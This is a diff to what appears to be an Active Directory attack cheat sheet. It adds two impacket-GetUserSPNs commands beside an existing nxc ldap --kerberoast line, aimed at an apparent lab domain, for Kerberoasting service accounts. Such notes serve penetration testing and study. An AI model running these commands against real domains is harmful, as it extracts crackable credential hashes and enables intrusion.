@@ -202,6 +202,8 @@ User → Group → ACL → Admin
 ### Find SPNs
 
 ```bash
+impacket-GetUserSPNs canozkan.local/<username>:<password> -dc-ip 192.168.56.108
+impacket-GetUserSPNs canozkan.local/<username>:<password> -dc-ip 192.168.56.108 -request
 nxc ldap <DC-IP> -u user -p pass --kerberoast
 ```
 
